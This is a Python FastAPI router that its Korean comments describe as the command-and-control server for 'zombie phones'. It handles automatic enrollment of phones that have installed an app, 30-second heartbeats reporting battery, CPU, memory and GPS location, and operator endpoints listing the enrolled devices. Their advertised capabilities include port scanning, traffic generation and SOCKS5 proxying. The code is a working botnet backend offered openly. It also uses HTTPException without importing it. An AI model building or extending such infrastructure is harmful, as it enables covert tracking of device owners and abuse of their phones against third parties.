from fastapi import APIRouter, Depends, Request
from sqlalchemy.ext.asyncio import AsyncSession
from typing import List
from core.database import get_db
from api.schemas.node import NodeRegister, NodeResponse, NodeHeartbeat
from api.dependencies import verify_node_auth
from services.node_service import NodeService
from models.node import Node, NodeStatus

router = APIRouter(prefix="/api/nodes", tags=["nodes"])


@router.post("/register", response_model=dict)
async def register_node(
    node_data: NodeRegister,
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """
    새 좀비폰 등록 (폰에서 자동 실행됨)

    앱을 폰에 설치하면 자동으로 이 API를 호출해서 C2 서버에 등록합니다.
    등록하면 API 키를 받아서 이후 통신에 사용합니다.

    **요청 예시:**
    ```json
    {
        "node_type": "android",
        "device_name": "Galaxy S21",
        "os_version": "Android 13",
        "api_level": 33,
        "model": "SM-G991N",
        "capabilities": ["port_scan", "traffic_gen", "socks5_proxy"]
    }
    ```

    **응답:**
    - node_id: 폰 고유 ID (이걸로 나중에 명령 보냄)
    - api_key: 인증키 (폰이 저장해서 계속 사용)
    """
    ip_address = request.client.host

    node, api_key = await NodeService.register_node(db, node_data, ip_address)

    return {
        "node_id": node.node_id,
        "api_key": api_key,
        "message": "Node registered successfully"
    }


@router.post("/heartbeat")
async def heartbeat(
    heartbeat_data: NodeHeartbeat,
    request: Request,
    current_node: Node = Depends(verify_node_auth),
    db: AsyncSession = Depends(get_db)
):
    """
    하트비트 전송 (폰이 살아있다고 알림)

    등록된 폰이 30초마다 자동으로 이 API를 호출해서 "나 아직 살아있어요!" 라고 알립니다.
    배터리, CPU, 메모리 상태도 같이 보냅니다.

    **요청 예시:**
    ```json
    {
        "battery_level": 85,
        "cpu_usage": 23.5,
        "memory_usage": 2048,
        "location": {
            "latitude": 37.5665,
            "longitude": 126.9780
        }
    }
    ```

    **인증:** Header에 `X-API-Key: {api_key}` 필요
    """
    ip_address = request.client.host

    await NodeService.update_heartbeat(
        db,
        current_node.node_id,
        heartbeat_data,
        ip_address
    )

    return {"status": "ok", "message": "Heartbeat updated"}


@router.get("/", response_model=List[NodeResponse])
async def get_all_nodes(
    status: NodeStatus = None,
    db: AsyncSession = Depends(get_db)
):
    """
    등록된 모든 좀비폰 목록 조회

    현재 등록된 모든 폰들의 상태를 확인합니다.
    온라인/오프라인 필터링도 가능합니다.

    **사용법:**
    - 전체 조회: `GET /api/nodes/`
    - 온라인만: `GET /api/nodes/?status=online`
    - 오프라인만: `GET /api/nodes/?status=offline`

    **응답 예시:**
    ```json
    [
        {
            "node_id": "abc123...",
            "node_type": "android",
            "device_name": "Galaxy S21",
            "status": "online",
            "last_seen": "2025-12-09T15:20:00",
            "battery_level": 85
        }
    ]
    ```
    """
    nodes = await NodeService.get_all_nodes(db, status)
    return nodes


@router.get("/{node_id}", response_model=NodeResponse)
async def get_node(
    node_id: str,
    db: AsyncSession = Depends(get_db)
):
    """
    특정 좀비폰 상세 정보 조회

    node_id로 특정 폰의 자세한 정보를 확인합니다.

    **사용법:** `GET /api/nodes/{node_id}`

    **응답:** 폰의 전체 정보 (디바이스명, OS, 배터리, 위치, 마지막 접속 시간 등)
    """
    node = await NodeService.get_node_by_id(db, node_id)
    if not node:
        raise HTTPException(status_code=404, detail="Node not found")
    return node
